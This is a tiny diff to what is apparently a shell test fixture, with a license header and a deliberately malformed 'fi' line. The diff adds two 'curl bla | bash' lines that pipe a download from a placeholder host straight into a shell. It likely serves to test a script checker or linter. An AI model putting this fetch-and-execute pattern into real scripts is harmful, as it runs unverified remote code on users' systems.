@@ -13,5 +13,9 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+curl bla | bash
+
 # syntax error: unexpected token 'fi'
 fi
+
+curl bla | bash
